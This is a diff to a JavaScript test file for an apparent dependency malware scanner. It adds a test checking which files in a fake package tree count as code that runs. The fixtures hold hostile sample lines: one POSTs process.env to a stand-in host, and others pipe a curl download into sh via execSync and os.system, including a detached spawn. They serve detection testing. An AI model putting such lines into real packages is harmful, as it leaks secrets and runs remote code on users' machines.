@@ -12,7 +12,7 @@ import { mkdtempSync, mkdirSync, writeFileSync, readFileSync, rmSync, symlinkSyn
 import { tmpdir } from "node:os";
 import { join, dirname } from "node:path";
 import { run } from "../src/index.js";
-import { treeJoin } from "../src/deps.js";
+import { treeJoin, npmEntries } from "../src/deps.js";
 
 const EXFIL = "const h = require('https');\n" +
   "h.request({host: 'collector.invalid', method: 'POST'}).end(JSON.stringify(process.env));\n";
@@ -145,4 +145,51 @@ test("treeJoin: inside the scan root only", () => {
     [["a", "."], "a"], [["a", ".."], null], [["a", "b//c/"], "a/b/c"],
   ];
   for (const [[base, target], want] of cases) assert.equal(treeJoin(base, target), want, `${base} + ${target}`);
+});
+
+// (the detection round) a web app's static assets run in a browser: left out unless an entry point
+// reaches them (deps.js webAssets; the Python test has the same tree)
+const WEB = "require('child_process').execSync('curl -s https://files.invalid/x | sh');\n";
+const WEB_TREE = {
+  "package.json": JSON.stringify({ name: "app", version: "1.0.0" }),
+  "node_modules/w/package.json": JSON.stringify({ name: "w", version: "1.0.0", main: "lib/index.js" }),
+  "node_modules/w/lib/index.js": "module.exports = require('../public/widget');\n",
+  "node_modules/w/public/widget.js": WEB,
+  "node_modules/w/public/other.js": WEB,
+  "node_modules/w/static/chunk.js": WEB,
+  "node_modules/w/_next/static/x.js": WEB,
+  "node_modules/x/package.json": JSON.stringify({ name: "x", version: "1.0.0", main: "static/index.js", bin: { x: "./static/cli.js" },
+    exports: { ".": "./static/index.js", "./y": { require: "./static/y.js" } } }),
+  "node_modules/x/static/index.js": WEB,
+  "node_modules/x/static/cli.js": WEB,
+  "node_modules/x/static/y.js": WEB,
+  "node_modules/x/static/z.js": WEB,
+  "node_modules/s/package.json": JSON.stringify({ name: "s", version: "1.0.0" }),
+  "node_modules/s/index.js": "const { spawn } = require('child_process');\nconst path = require('path');\n"
+    + "spawn(process.execPath, [path.join(__dirname, 'public', 'run.js')], { detached: true });\n",
+  "node_modules/s/public/run.js": WEB,
+  "lib/python3.12/site-packages/ui/proxy/_experimental/out/_next/static/chunks/c.js": WEB,
+  "lib/python3.12/site-packages/ui/__init__.py": "import os\nos.system('curl -s https://files.invalid/x | sh')\n",
+};
+
+test("--deps: a web app's static assets no entry point reaches are not code that runs", () => {
+  const root = mkdtempSync(join(tmpdir(), "lz-deps-web-"));
+  try {
+    for (const [rel, data] of Object.entries(WEB_TREE)) {
+      const path = join(root, ...rel.split("/"));
+      mkdirSync(dirname(path), { recursive: true });
+      writeFileSync(path, data);
+    }
+    const rep = scan(root, "--deps");
+    assert.deepEqual(rep.issues.filter((i) => i.rule === "SC-IMPORT-RISK").map((i) => slash(i.file)).sort(), [
+      "lib/python3.12/site-packages/ui/__init__.py", "node_modules/s/public/run.js", "node_modules/w/public/widget.js",
+      "node_modules/x/static/cli.js", "node_modules/x/static/index.js", "node_modules/x/static/y.js",
+    ]);
+  } finally {
+    rmSync(root, { recursive: true, force: true });
+  }
+  assert.deepEqual(npmEntries({ main: "a.js", module: "b.mjs", bin: { c: "c.js", d: 1 },
+    exports: { ".": { import: "./e.mjs", require: ["./f.js", "./g.js"] }, "./*": "./h/*.js" } }),
+  ["a.js", "b.mjs", "c.js", "./e.mjs", "./f.js", "./g.js"]);
+  assert.deepEqual(npmEntries({ bin: "x.js", exports: "./y.js" }), ["x.js", "./y.js"]);
 });
